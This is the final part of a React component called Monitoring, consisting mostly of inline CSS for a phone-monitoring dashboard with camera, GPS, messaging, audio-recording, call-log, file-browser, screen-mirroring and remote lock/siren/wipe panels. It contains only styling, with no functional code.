        .app-category { font-size: 0.7rem; color: var(--text-tertiary); }

        /* --- Camera Vision Pulse & Loader --- */
        .iris-loader {
          width: 40px;
          height: 40px;
          border: 3px solid rgba(255,255,255,0.1);
          border-top-color: #6366f1;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .rec-dot {
          width: 8px;
          height: 8px;
          background: #ff3b30;
          border-radius: 50%;
          animation: blink 1s infinite;
        }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        .btn-cam-toggle {
          background: rgba(255,255,255,0.05);
          border: 1px solid var(--border-color);
          color: white;
          padding: 8px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-weight: 600;
          transition: 0.2s;
        }

        .btn-cam-toggle:hover { background: rgba(255,255,255,0.1); }
        .btn-cam-toggle.active { background: #6366f1; border-color: transparent; }

        .camera-info {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }

        .info-row {
          display: flex;
          justify-content: space-between;
          padding-bottom: 8px;
          border-bottom: 1px solid var(--border-color);
          font-size: 0.8rem;
        }

        .info-row span:first-child { color: var(--text-tertiary); }
        .info-row span:last-child { font-weight: 700; color: #fff; }

        .btn-gps-refresh {
          background: rgba(99, 102, 241, 0.1);
          border: 1px solid rgba(99, 102, 241, 0.3);
          color: #818cf8;
          padding: 4px 10px;
          border-radius: 6px;
          font-size: 0.7rem;
          font-weight: 700;
          cursor: pointer;
          transition: 0.2s;
        }

        .btn-gps-refresh:hover { background: rgba(99, 102, 241, 0.2); }
        .btn-gps-refresh.loading { 
          opacity: 0.7; 
          cursor: wait;
          animation: btnPulse 1s infinite alternate;
        }

        /* Messaging Tab */
        .message-bubble {
          background: rgba(255, 255, 255, 0.03);
          border-left: 4px solid #6366f1;
          padding: 12px 18px;
          border-radius: 8px;
          margin-bottom: 15px;
          animation: slideInLeft 0.3s ease-out;
        }
        .message-bubble.NOTIF { border-color: #f59e0b; }
        .message-bubble.SYSTEM { border-color: #10b981; }
        .msg-header { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 0.75rem; opacity: 0.7; }
        .msg-sender { font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        .msg-content { margin: 0; color: #fff; font-size: 0.95rem; line-height: 1.4; }

        /* Audio Tab */
        .audio-hero {
          background: linear-gradient(135deg, rgba(99,102,241,0.1) 0%, rgba(168,85,247,0.1) 100%);
          border-radius: 20px;
          padding: 40px;
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 30px;
          margin-bottom: 40px;
          border: 1px solid rgba(255,255,255,0.05);
        }
        .audio-visualizer {
          height: 100px;
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .wave-anim {
          width: 150px;
          height: 40px;
          background: url('https://cdn.pixabay.com/animation/2023/04/27/22/04/22-04-18-971_512.gif') center/contain no-repeat;
          filter: hue-rotate(240deg) brightness(1.5);
        }
        .btn-record {
          background: #ef4444;
          color: white;
          padding: 15px 35px;
          border-radius: 50px;
          font-weight: 800;
          border: none;
          cursor: pointer;
          transition: 0.3s;
          box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
        }
        .btn-record.recording {
          animation: pulseRed 1s infinite;
          background: #991b1b;
        }
        @keyframes pulseRed {
          0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
          70% { box-shadow: 0 0 0 20px rgba(239, 68, 68, 0); }
          100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }

        /* System Tab */
        .system-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
          gap: 20px;
        }
        .command-card {
          background: rgba(255,255,255,0.03);
          border: 1px solid var(--border-color);
          border-radius: 16px;
          padding: 24px;
          display: flex;
          flex-direction: column;
          gap: 15px;
          transition: 0.3s;
        }
        .command-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.05); }
        .command-card button {
          width: 100%;
          padding: 12px;
          border-radius: 8px;
          border: none;
          font-weight: 700;
          cursor: pointer;
          background: #374151;
          color: #fff;
        }
        .command-card.lock button { background: #6366f1; }
        .command-card.siren button { background: #f59e0b; }
        .command-card.wipe button { background: #dc2626; }
        .cmd-icon { font-size: 2.5rem; }
        .cmd-info h4 { margin: 0; font-size: 1.1rem; }
        .cmd-info p { font-size: 0.8rem; opacity: 0.6; margin: 5px 0 0 0; }

        /* Files Tab */
        .file-browser {
          background: #000;
          border-radius: 12px;
          overflow: hidden;
          border: 1px solid var(--border-color);
        }
        .path-bar {
          background: #111;
          padding: 10px 20px;
          font-size: 0.8rem;
          color: #6366f1;
          font-family: monospace;
          border-bottom: 1px solid var(--border-color);
        }
        .file-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
          gap: 15px;
          padding: 20px;
          max-height: 400px;
          overflow-y: auto;
        }
        .file-item {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 8px;
          padding: 10px;
          border-radius: 8px;
          cursor: pointer;
        }
        .file-item:hover { background: rgba(255,255,255,0.05); }
        .file-icon { font-size: 2rem; }
        .file-name { font-size: 0.7rem; text-align: center; word-break: break-all; }

        .app-time-bar-container {
          flex: 1;
          height: 4px;
          background: rgba(255,255,255,0.05);
          border-radius: 2px;
          margin: 0 20px;
        }

        .app-time-bar { height: 100%; border-radius: 2px; }
        .app-time { font-weight: 700; font-size: 0.9rem; }

        /* Logs Table */
        .comms-table {
           background: rgba(0,0,0,0.2);
           border-radius: 12px;
           overflow: hidden;
           border: 1px solid var(--border-color);
        }

        .table-header {
           display: grid;
           grid-template-columns: 1.5fr 1.5fr 1fr 1.2fr;
           padding: 12px 20px;
           background: rgba(255,255,255,0.05);
           font-size: 0.75rem;
           text-transform: uppercase;
           letter-spacing: 1px;
           color: var(--text-tertiary);
           font-weight: 700;
        }

        .table-row {
           display: grid;
           grid-template-columns: 1.5fr 1.5fr 1fr 1.2fr;
           padding: 15px 20px;
           border-bottom: 1px solid var(--border-color);
           font-size: 0.9rem;
           transition: background 0.2s;
        }

        .table-row:hover { background: rgba(255,255,255,0.02); }

        .type-tag {
           padding-left: 10px;
           border-left: 3px solid transparent;
           font-weight: 600;
        }

        .contact-name { color: var(--text-primary); }
        .log-duration { font-family: monospace; font-weight: 400; color: var(--accent-secondary); }

        /* --- NEW: Mirroring CSS --- */
        .mirror-header {
           display: flex;
           justify-content: space-between;
           align-items: center;
           margin-bottom: 25px;
        }

        .btn-mirror-toggle {
           padding: 10px 20px;
           background: #4cd964;
           color: white;
           border: none;
           border-radius: 8px;
           font-weight: 700;
           cursor: pointer;
           transition: 0.3s;
        }

        .btn-mirror-toggle.running { background: #ff3b30; }

        .phone-mockup-wrapper {
           display: flex;
           gap: 40px;
           align-items: flex-start;
           justify-content: center;
           padding: 40px 0;
        }

        .phone-frame {
           width: 280px;
           height: 560px;
           background: #111;
           border: 12px solid #222;
           border-radius: 40px;
           position: relative;
           box-shadow: 0 0 50px rgba(0,0,0,0.5), inset 0 0 10px rgba(255,255,255,0.1);
           display: flex;
           flex-direction: column;
           overflow: hidden;
        }

        .phone-speaker {
           width: 60px;
           height: 6px;
           background: #333;
           border-radius: 10px;
           position: absolute;
           top: 15px;
           left: 50%;
           transform: translateX(-50%);
        }

        .phone-screen-inner {
           flex: 1;
           background: #000;
           margin: 15px 5px;
           border-radius: 20px;
           overflow: hidden;
           display: flex;
           align-items: center;
           justify-content: center;
           position: relative;
        }

        .live-screen-image {
           width: 100%;
           height: 100%;
           object-fit: cover;
        }

        .screen-placeholder {
           text-align: center;
           color: var(--text-tertiary);
           font-size: 0.8rem;
        }

        .pulse-circle {
           width: 40px;
           height: 40px;
           border: 3px solid var(--accent-secondary);
           border-radius: 50%;
           margin: 0 auto 15px;
           animation: mirrorPulse 1.5s infinite;
        }

        @keyframes mirrorPulse {
           0% { transform: scale(0.8); opacity: 1; }
           100% { transform: scale(1.5); opacity: 0; }
        }

        .phone-home-btn {
           width: 35px;
           height: 35px;
           border: 2px solid #333;
           border-radius: 50%;
           position: absolute;
           bottom: 10px;
           left: 50%;
           transform: translateX(-50%);
        }

        .mirror-info p {
           margin-bottom: 10px;
           font-size: 0.9rem;
           color: var(--text-secondary);
        }

        .no-selection {
          height: 100%;
          display: flex;
          align-items: center;
          justify-content: center;
          color: var(--text-tertiary);
          text-align: center;
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 900px) {
          .dashboard-container {
            grid-template-columns: 1fr;
            height: auto;
          }
          .dashboard-sidebar {
            height: 400px;
            border-right: none;
            border-bottom: 1px solid var(--border-color);
          }
        }
      `}} />
    </div>
  );
};

export default Monitoring;
